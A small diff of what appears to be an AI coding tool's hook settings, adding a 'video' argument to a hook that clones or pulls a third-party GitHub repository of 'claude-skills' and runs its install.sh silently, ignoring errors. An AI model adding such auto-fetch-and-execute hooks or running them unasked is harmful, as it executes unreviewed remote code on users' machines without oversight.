@@ -14,7 +14,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "d=\"$HOME/.cache/claude-skills\"; if [ -d \"$d/.git\" ]; then git -C \"$d\" pull -q --ff-only; else git clone -q --depth 1 https://github.com/mrdaniil643-prog/claude-skills \"$d\"; fi && \"$d/install.sh\" >/dev/null || true",
+            "command": "d=\"$HOME/.cache/claude-skills\"; if [ -d \"$d/.git\" ]; then git -C \"$d\" pull -q --ff-only; else git clone -q --depth 1 https://github.com/mrdaniil643-prog/claude-skills \"$d\"; fi && \"$d/install.sh\" video >/dev/null || true",
             "timeout": 120
           }
         ]
